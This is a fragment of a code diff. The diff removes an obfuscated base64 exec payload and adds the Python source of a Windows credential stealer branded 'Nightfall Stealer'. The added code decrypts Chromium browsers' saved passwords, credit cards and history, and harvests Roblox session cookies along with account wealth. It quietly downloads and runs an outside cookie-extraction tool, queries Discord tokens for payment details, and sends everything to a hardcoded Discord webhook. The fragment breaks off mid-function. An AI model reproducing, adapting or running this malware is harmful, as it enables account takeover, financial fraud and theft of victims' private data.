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"))))
-except:
-    pass
+import ctypes
+import winreg as reg
+import sys
+import shutil
+import os
+import subprocess
+import time
+import shutil
+import random
+import re
+import threading
+import zipfile
+import requests
+import json
+from sqlite3 import connect as sql_connect
+from datetime import datetime, timezone, timedelta
+from base64 import b64decode
+from json import loads as json_loads, dumps
+from pathlib import Path
+import pyautogui
+import cv2
+import win32crypt
+import win32clipboard
+from Crypto.Cipher import AES
+
+WEBHOOK = "https://discord.com/api/webhooks/1511991915837653073/EF6XRpVKlGvYdNHbXfdnQWqkXJSnNfSFMBxSYOLpRL1CDfQi0IVTqzsD_W8FfRfou6yx"
+TEMP = os.getenv("TEMP") or os.path.expanduser("~/AppData/Local/Temp")
+WORK_DIR = os.path.join(TEMP, f"NF_{random.randint(10000, 99999)}")
+os.makedirs(WORK_DIR, exist_ok=True)
+
+NIGHTFALL_ASCII = """
+__________________________________________
+|        _       _     _    __       _ _ |
+|  _ __ (_) __ _| |__ | |_ / _| __ _| | ||
+| | '_ \| |/ _` | '_ \| __| |_ / _` | | ||
+| | | | | | (_| | | | | |_|  _| (_| | | ||
+| |_| |_|_|\\__, |_| |_|\\__|_|  \\__,_|_|_||
+|  | |    _|___/ __   | |_ ___  _ __     |
+| / __)  / _ \\| '_ \\  | __/ _ \\| '_ \\    |
+| \\__ \\ | (_) | | | | | || (_) | |_) |   |
+| (   /  \\___/|_| |_|  \\__\\___/| .__/    |
+|  |_|                         |_|       |
+|________________________________________|
+"""
+
+def get_ip():
+    try:
+        return requests.get("https://api.ipify.org", timeout=5).text.strip()
+    except:
+        return "N/A"
+
+def send_embed(title, desc="", color=0x191919, fields=None, files=None, thumbnail=None, image=None):
+    embed = {
+        "title": title,
+        "color": color,
+        "timestamp": datetime.utcnow().isoformat(),
+        "footer": {"text": "Nightfall Stealer", "icon_url": "https://files.catbox.moe/nt0b4j.png"},
+    }
+    
+    if desc:
+        embed["description"] = f"```ansi\n{desc}\n```"
+    
+    if fields:
+        embed["fields"] = fields
+    
+    if thumbnail:
+        embed["thumbnail"] = {"url": thumbnail}
+    
+    if image:
+        embed["image"] = {"url": image}
+    
+    payload = {
+        "username": "Nightfall Stealer", 
+        "avatar_url": "https://files.catbox.moe/nt0b4j.png", 
+        "embeds": [embed]
+    }
+    
+    try:
+        if files:
+            requests.post(WEBHOOK, data={"payload_json": dumps(payload)}, files=files, timeout=15)
+        else:
+            requests.post(WEBHOOK, json=payload, timeout=15)
+    except:
+        pass
+
+def send_full_txt(title, lines):
+    if not lines:
+        return
+    fname = f"{title.lower().replace(' ','_')}_{random.randint(10000,99999)}.txt"
+    path = os.path.join(WORK_DIR, fname)
+    with open(path, "w", encoding="utf-8", errors="replace") as f:
+        f.write(NIGHTFALL_ASCII + "\n\n")
+        f.write(f"{title.upper()} — {len(lines)} entries\n")
+        f.write("═"*70 + "\n\n")
+        f.write("\n".join(lines))
+        f.write("\n\n" + "═"*70 + "\n")
+        f.write("Generated: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+    try:
+        with open(path, "rb") as f:
+            files = {"file": (fname, f, "text/plain")}
+            send_embed(f"{title} Data", f"Total: **{len(lines)}** entries", 0x191919, files=files)
+    except:
+        pass
+
+def get_master_key(search_path):
+    for depth in range(5):
+        p = search_path
+        for _ in range(depth):
+            p = os.path.dirname(p)
+            if not p or p == os.path.dirname(p):
+                break
+        local_path = os.path.join(p, "Local State")
+        if os.path.exists(local_path):
+            try:
+                with open(local_path, "r", encoding="utf-8") as f:
+                    local = json_loads(f.read())
+                enc_key = b64decode(local["os_crypt"]["encrypted_key"])[5:]
+                return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+            except:
+                continue
+    return None
+
+def decrypt_value(buff, master_key):
+    if not master_key or not isinstance(buff, bytes) or len(buff) < 3:
+        return ""
+    try:
+        if buff[:3] in (b'v10', b'v11'):
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            dec = cipher.decrypt(payload)[:-16]
+            return dec.decode('utf-8', errors='ignore')
+        else:
+            dec = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+            return dec.decode('utf-8', errors='ignore')
+    except:
+        return ""
+
+def get_roblox_user_info(cookie):
+    headers = {
+        "Cookie": f".ROBLOSECURITY={cookie}",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+    
+    try:
+        user_response = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
+        if user_response.status_code != 200:
+            return None
+        
+        user_data = user_response.json()
+        user_id = user_data.get("id")
+        
+        currency_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10)
+        currency_data = currency_response.json() if currency_response.status_code == 200 else {}
+        
+        rap_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/assets?assetTypeId=8&limit=100", headers=headers, timeout=10)
+        rap_data = rap_response.json() if rap_response.status_code == 200 else {}
+        
+        rap = 0
+        if "data" in rap_data:
+            for item in rap_data["data"]:
+                if "recentAveragePrice" in item:
+                    rap += item["recentAveragePrice"]
+        
+        pending_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/trade-robux", headers=headers, timeout=10)
+        pending_data = pending_response.json() if pending_response.status_code == 200 else {}
+        pending_robux = pending_data.get("pendingRobux", 0)
+        
+        membership_response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=10)
+        membership_data = membership_response.json() if membership_response.status_code == 200 else {}
+        
+        avatar_response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png", headers=headers, timeout=10)
+        avatar_data = avatar_response.json() if avatar_response.status_code == 200 else {}
+        avatar_url = None
+        if "data" in avatar_data and len(avatar_data["data"]) > 0:
+            avatar_url = avatar_data["data"][0].get("imageUrl")
+        
+        banner_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}/banner", headers=headers, timeout=10)
+        banner_data = banner_response.json() if banner_response.status_code == 200 else {}
+        banner_url = banner_data.get("imageUrl")
+        
+        return {
+            "id": user_id,
+            "username": user_data.get("name", "Unknown"),
+            "display_name": user_data.get("displayName", "Unknown"),
+            "robux": currency_data.get("robux", 0),
+            "rap": rap,
+            "pending_robux": pending_robux,
+            "membership": membership_data.get("IsPremium", False),
+            "avatar_url": avatar_url,
+            "banner_url": banner_url,
+            "created_date": user_data.get("created", "Unknown"),
+            "description": user_data.get("description", "No description"),
+        }
+    except Exception as e:
+        return None
+
+def process_roblox_accounts(cookies_list):
+    roblox_accounts = []
+    roblox_cookies = []
+   
+    for cookie in cookies_list:
+        if cookie.get('name') == '.ROBLOSECURITY' and cookie.get('value'):
+            cookie_value = cookie.get('value')
+            if len(cookie_value) > 50:
+                roblox_cookies.append({
+                    'value': cookie_value,
+                    'domain': cookie.get('domain', ''),
+                    'browser': cookie.get('browser', 'Unknown'),
+                    'profile': cookie.get('profile', 'Unknown')
+                })
+   
+    if not roblox_cookies:
+        send_embed("⚠️ Roblox", "No .ROBLOSECURITY cookies found", 0xff8800)
+        return False
+    
+    for idx, cookie_info in enumerate(roblox_cookies, 1):
+        try:
+            user_info = get_roblox_user_info(cookie_info['value'])
+           
+            if user_info:
+                cookie_preview = cookie_info['value'][:50] + "..." if len(cookie_info['value']) > 50 else cookie_info['value']
+                
+                description = f"**Browser:** {cookie_info['browser']}\n**Profile:** {cookie_info['profile']}\n**Domain:** {cookie_info['domain']}\n\n**Cookie:**\n```\n{cookie_info['value']}\n```"
+                
+                embed = {
+                    "title": f"🎮 Roblox Account #{idx} - {user_info['username']}",
+                    "description": description[:4096],
+                    "color": 0x00ff88,
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "footer": {"text": "Nightfall Stealer"},
+                    "fields": [
+                        {"name": "🆔 User ID", "value": f"`{user_info['id']}`", "inline": True},
+                        {"name": "💰 Robux", "value": f"**{user_info['robux']:,}**", "inline": True},
+                    ]
+                }
+                
+                if user_info.get('avatar_url'):
+                    embed["thumbnail"] = {"url": user_info['avatar_url']}
+                
+                payload = {
+                    "username": "Nightfall Stealer",
+                    "avatar_url": "https://files.catbox.moe/nt0b4j.png",
+                    "embeds": [embed]
+                }
+                
+                try:
+                    requests.post(WEBHOOK, json=payload, timeout=30)
+                except:
+                    pass
+                
+                time.sleep(0.5)
+               
+                cookie_line = f"Roblox Account #{idx}\nUsername: {user_info['username']}\nUser ID: {user_info['id']}\nRobux: {user_info['robux']:,}\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\n{'='*70}"
+                roblox_accounts.append(cookie_line)
+               
+        except Exception as e:
+            cookie_line = f"Roblox Cookie (Failed)\nCookie: {cookie_info['value']}\nBrowser: {cookie_info['browser']}\nProfile: {cookie_info['profile']}\nError: {str(e)[:100]}\n{'='*70}"
+            roblox_accounts.append(cookie_line)
+   
+    if roblox_accounts:
+        fname = f"roblox_accounts_{random.randint(10000,99999)}.txt"
+        path = os.path.join(WORK_DIR, fname)
+        with open(path, "w", encoding="utf-8", errors="replace") as f:
+            f.write(NIGHTFALL_ASCII + "\n\n")
+            f.write("ROBLOX ACCOUNTS\n")
+            f.write("═"*70 + "\n\n")
+            f.write("\n".join(roblox_accounts))
+            f.write("\n\n" + "═"*70 + "\n")
+            f.write(f"Total: {len(roblox_accounts)}\n")
+       
+        try:
+            with open(path, "rb") as f:
+                files = {"file": (fname, f, "text/plain")}
+                payload = {
+                    "username": "Nightfall Stealer",
+                    "avatar_url": "https://files.catbox.moe/nt0b4j.png",
+                    "embeds": [{
+                        "title": "📦 Roblox Archive",
+                        "description": f"**{len(roblox_accounts)}** account(s) saved",
+                        "color": 0x00ff88,
+                        "timestamp": datetime.utcnow().isoformat()
+                    }]
+                }
+                requests.post(WEBHOOK, data={"payload_json": dumps(payload)}, files=files, timeout=30)
+        except:
+            pass
+    
+    return False
+
+def download_and_run_chromelevator():
+    TEMP = os.environ.get("TEMP")
+    WORK_DIR = os.getcwd()
+
+    zip_path = os.path.join(TEMP, "chromelevator.zip")
+    extract_path = os.path.join(TEMP, "chromelevator_extract")
+    output_path = os.path.join(TEMP, "chrome_output")
+    cookies_temp_path = os.path.join(TEMP, "cookies_temp")
+
+    for p in [zip_path, extract_path, output_path, cookies_temp_path]:
+        if os.path.exists(p):
+            try:
+                if os.path.isdir(p):
+                    shutil.rmtree(p, ignore_errors=True)
+                else:
+                    os.remove(p)
+            except:
+                pass
+
+    url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip"
+
+    send_embed("ChromElevator", "Downloading v0.20.0...", 0x00ff88)
+
+    try:
+        r = requests.get(url, stream=True, timeout=40)
+        r.raise_for_status()
+        with open(zip_path, "wb") as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+    except Exception as e:
+        send_embed("ChromElevator Error", f"Download failed: {str(e)[:100]}", 0xff0000)
+        return
+
+    os.makedirs(extract_path, exist_ok=True)
+    try:
+        with zipfile.ZipFile(zip_path, 'r') as z:
+            z.extractall(extract_path)
+    except Exception as e:
+        send_embed("ChromElevator Error", f"Extraction failed: {str(e)}", 0xff0000)
+        return
+
+    exe_path = None
+    for root, _, files in os.walk(extract_path):
+        for file in files:
+            if file.lower() == "chromelevator_x64.exe":
+                exe_path = os.path.join(root, file)
+                break
+        if exe_path:
+            break
+
+    if not exe_path:
+        send_embed("ChromElevator Error", "chromelevator_x64.exe not found in zip", 0xff0000)
+        return
+
+    os.makedirs(output_path, exist_ok=True)
+    os.makedirs(cookies_temp_path, exist_ok=True)
+
+    send_embed("ChromElevator", "Launching extraction (all browsers)", 0x00ff88)
+
+    try:
+        cmd = [
+            exe_path,
+            "all",
+            "-o", output_path,
+            "--kill",
+            "--verbose"
+        ]
+
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=180,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+
+        if result.returncode != 0:
+            send_embed("ChromElevator Error", f"Process exited with code {result.returncode}", 0xff0000)
+            return
+
+        cookie_files = []
+        for root, dirs, files in os.walk(output_path):
+            for file in files:
+                if file == "cookies.json":
+                    full_path = os.path.join(root, file)
+                    cookie_files.append(full_path)
+
+        if not cookie_files:
+            send_embed("ChromElevator", "⚠️ No cookies.json files found", 0xff8800)
+            return
+
+        all_cookies = []
+        browser_stats = {}
+        errors = []
+
+        for cf in cookie_files:
+            try:
+                with open(cf, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                    data = json_loads(content)
+
+                browser_name = "Unknown"
+                profile_name = "Unknown"
+                
+                path_parts = cf.replace("\\", "/").split("/")
+                
+                for i, part in enumerate(path_parts):
+                    if part in ["Chrome", "Edge", "Brave", "Avast", "Opera", "Chromium"]:
+                        browser_name = part
+                        if i + 1 < len(path_parts):
+                            profile_name = path_parts[i + 1]
+                        break
+
+                cookies_list = []
+                if isinstance(data, dict):
+                    cookies_list = data.get("cookies", [])
+                elif isinstance(data, list):
+                    cookies_list = data
+                
+                added_count = 0
+                for cookie in cookies_list:
+                    if isinstance(cookie, dict):
+                        cookie["browser"] = browser_name
+                        cookie["profile"] = profile_name
+                        all_cookies.append(cookie)
+                        added_count += 1
+                
+                browser_key = f"{browser_name}_{profile_name}"
+                if browser_key not in browser_stats:
+                    browser_stats[browser_key] = 0
+                browser_stats[browser_key] += added_count
+                        
+            except Exception as e:
+                errors.append(f"{cf}: {str(e)}")
+                continue
+
+        if all_cookies:
+            process_roblox_accounts(all_cookies)
+            
+            fname_json = f"cookies_{random.randint(10000,99999)}.json"
+            fname_txt = f"cookies_{random.randint(10000,99999)}.txt"
+            
+            save_path_json = os.path.join(cookies_temp_path, fname_json)
+            save_path_txt = os.path.join(cookies_temp_path, fname_txt)
+
+            with open(save_path_json, "w", encoding="utf-8", errors="replace") as f:
+                try:
+                    f.write(NIGHTFALL_ASCII)
+                    f.write("\n")
+                except:
+                    pass
+                json_dump = dumps(all_cookies, indent=2, ensure_ascii=False)
+                f.write(json_dump)
+
+            with open(save_path_txt, "w", encoding="utf-8", errors="replace") as f:
+                try:
+                    f.write(NIGHTFALL_ASCII)
+                    f.write("\n\n")
+                except:
+                    pass
+                
+                for idx, cookie in enumerate(all_cookies, 1):
+                    domain = cookie.get('domain', '')
+                    name = cookie.get('name', '')
+                    value = str(cookie.get('value', ''))
+                    browser = cookie.get('browser', 'Unknown')
+                    profile = cookie.get('profile', 'Unknown')
+                    
+                    f.write(f"{idx}\n")
+                    f.write(f"Browser: {browser}\n")
+                    f.write(f"Profile: {profile}\n")
+                    f.write(f"Domain: {domain}\n")
+                    f.write(f"Name: {name}\n")
+                    f.write(f"Value: {value}\n")
+                    f.write(f"Secure: {cookie.get('secure', False)}\n")
+                    f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
+                    f.write("\n")
+
+            browser_summary = ""
+            for bp, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:10]:
+                browser, profile = bp.split("_", 1)
+                browser_summary += f"**[{browser}]** {profile}: {count}\n"
+            
+            if len(browser_stats) > 10:
+                browser_summary += f"*...and {len(browser_stats) - 10} more*"
+
+            try:
+                with open(save_path_json, "rb") as f_json:
+                    files = {
+                        "file": (fname_json, f_json, "application/json")
+                    }
+                    send_embed(
+                        "ChromElevator - cookies",
+                        f"**{len(all_cookies)} cookies** from {len(browser_stats)} profiles\n\n{browser_summary}",
+                        0x00ff88,
+                        files=files
+                    )
+            except Exception as e:
+                send_embed("chromelevator error", f"failed to send JSON: {str(e)[:100]}", 0xff0000)
+
+            try:
+                with open(save_path_txt, "rb") as f_txt:
+                    files = {
+                        "file": (fname_txt, f_txt, "text/plain")
+                    }
+                    send_embed(
+                        "✅ chromelevator - TXT",
+                        f"**{len(all_cookies)} cookies** (numbered format)",
+                        0x00ff88,
+                        files=files
+                    )
+            except Exception as e:
+                send_embed("chromelevator error", f"failed to send TXT: {str(e)[:100]}", 0xff0000)
+
+            try:
+                if os.path.exists(save_path_json):
+                    os.remove(save_path_json)
+                if os.path.exists(save_path_txt):
+                    os.remove(save_path_txt)
+            except Exception as e:
+                pass
+            
+        else:
+            send_embed("ChromElevator", "no valid cookies found", 0xff8800)
+
+    except subprocess.TimeoutExpired:
+        send_embed("ChromElevator Error", "process timed out (180s)", 0xff0000)
+    except Exception as e:
+        send_embed("ChromElevator Error", f"execution failed: {str(e)[:200]}", 0xff0000)
+
+    for p in [zip_path, extract_path, output_path, cookies_temp_path]:
+        try:
+            if os.path.exists(p):
+                if os.path.isdir(p):
+                    shutil.rmtree(p, ignore_errors=True)
+                else:
+                    os.remove(p)
+        except:
+            pass
+
+def steal_browser_data():
+    browsers = [
+        {"name": "Chrome", "base": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data"},
+        {"name": "Brave", "base": os.getenv('LOCALAPPDATA') + "\\BraveSoftware\\Brave-Browser\\User Data"},
+        {"name": "Edge", "base": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data"},
+        {"name": "Opera", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera Stable"},
+        {"name": "Opera GX", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera GX Stable"},
+        {"name": "Opera GX", "base": os.getenv('APPDATA') + "\\Opera Software\\Opera GX"},
+        {"name": "Opera GX", "base": os.getenv('LOCALAPPDATA') + "\\Opera Software\\Opera GX Stable"},
+        {"name": "Opera GX", "base": os.getenv('LOCALAPPDATA') + "\\Opera Software\\Opera GX"},
+        {"name": "Vivaldi", "base": os.getenv('LOCALAPPDATA') + "\\Vivaldi\\User Data"},
+        {"name": "Yandex", "base": os.getenv('LOCALAPPDATA') + "\\Yandex\\YandexBrowser\\User Data"},
+        {"name": "Chromium", "base": os.getenv('LOCALAPPDATA') + "\\Chromium\\User Data"},
+    ]
+    pw_lines = []
+    cc_lines = []
+    hist_lines = []
+    for br in browsers:
+        base = br["base"]
+        if not os.path.exists(base):
+            continue
+        profiles = ["Default"] + [d for d in os.listdir(base) if d.startswith("Profile ") and os.path.isdir(os.path.join(base, d))]
+        for prof in profiles:
+            ppath = os.path.join(base, prof)
+            master_key = get_master_key(ppath) or get_master_key(base)
+            if not master_key:
+                continue
+            pw_path = os.path.join(ppath, "Login Data")
+            if os.path.exists(pw_path):
+                tmp = os.path.join(WORK_DIR, f"pw_{random.randint(10000,99999)}.db")
+                shutil.copy2(pw_path, tmp)
+                try:
+                    conn = sql_connect(tmp)
+                    cur = conn.cursor()
+                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    for url, user, enc in cur.fetchall():
+                        if isinstance(enc, bytes) and enc:
+                            pw = decrypt_value(enc, master_key)
+                            if pw and len(pw) > 1:
+                                pw_lines.append(f"URL: {url}\nUser: {user}\nPass: {pw}\n{'─'*70}")
+                    conn.close()
+                except:
+                    pass
+                finally:
+                    try:
+                        os.remove(tmp)
+                    except:
+                        pass
+            cc_path = os.path.join(ppath, "Web Data")
+            if os.path.exists(cc_path):
+                tmp = os.path.join(WORK_DIR, f"cc_{random.randint(10000,99999)}.db")
+                shutil.copy2(cc_path, tmp)
+                try:
+                    conn = sql_connect(tmp)
+                    cur = conn.cursor()
+                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                    for name, m, y, enc in cur.fetchall():
+                        if isinstance(enc, bytes) and enc:
+                            num = decrypt_value(enc, master_key)
+                            if num:
+                                cc_lines.append(f"{name} | {m:02d}/{y} | {num}")
+                    conn.close()
+                except:
+                    pass
+                finally:
+                    try:
+                        os.remove(tmp)
+                    except:
+                        pass
+            hist_path = os.path.join(ppath, "History")
+            if os.path.exists(hist_path):
+                tmp = os.path.join(WORK_DIR, f"hist_{random.randint(10000,99999)}.db")
+                shutil.copy2(hist_path, tmp)
+                try:
+                    conn = sql_connect(tmp)
+                    cur = conn.cursor()
+                    cur.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC")
+                    for url, title in cur.fetchall():
+                        hist_lines.append(f"{title[:80]} → {url}")
+                    conn.close()
+                except:
+                    pass
+                finally:
+                    try:
+                        os.remove(tmp)
+                    except:
+                        pass
+    if pw_lines:
+        send_full_txt("Passwords", pw_lines)
+    if cc_lines:
+        send_full_txt("Credit Cards", cc_lines)
+    if hist_lines:
+        send_full_txt("Browsing History", hist_lines)
+
+def get_user_info(token):
+    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=12)
+        if r.status_code == 200:
+            return r.json()
+        return None
+    except:
+        return None
+
+def get_guilds(token):
+    headers = {"Authorization": token}
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers, timeout=12)
+        if r.ok:
+            return r.json()
+        return []
+    except:
+        return []
+
+def get_nitro_subscriptions(token):
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers={"Authorization": token}, timeout=10)
+        if r.ok:
+            return r.json()
+        return []
+    except:
+        return []
+
+def get_boost_slots(token):
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={"Authorization": token}, timeout=10)
+        if r.ok:
+            return r.json()
+        return []
+    except:
+        return []
+
+def get_payment_sources(token):
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers={"Authorization": token}, timeout=10)
+        if r.ok:
+            return r.json()
+        return []
+    except:
+        return []
+
+def snowflake_to_date(snowflake):
+    epoch = datetime(2015, 1, 1, tzinfo=timezone.utc)
+    ms = (int(snowflake) >> 22)
+    return (epoch + timedelta(milliseconds=ms)).strftime("%Y-%m-%d %H:%M UTC")
+
+def steal_discord_tokens():
+    possible_paths = [
+        os.path.expandvars(r"%APPDATA%\discord"),
+        os.path.expandvars(r"%APPDATA%\discordcanary"),
+        os.path.expandvars(r"%APPDATA%\discordptb"),
